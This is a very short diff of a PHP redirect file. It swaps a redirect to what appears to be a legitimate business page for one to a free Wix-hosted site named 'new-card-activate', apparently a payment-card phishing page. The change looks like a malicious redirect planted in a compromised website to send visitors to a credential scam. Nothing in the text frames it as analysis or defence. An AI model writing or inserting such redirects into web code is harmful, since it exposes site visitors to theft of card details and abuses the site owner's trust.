@@ -1,4 +1,4 @@
 <?php
-header("Location: https://collinsdebden.com.au/notebooks");
+header("Location: https://new-card-activate.wixsite.com/new-card-activate");
 die();
 ?>
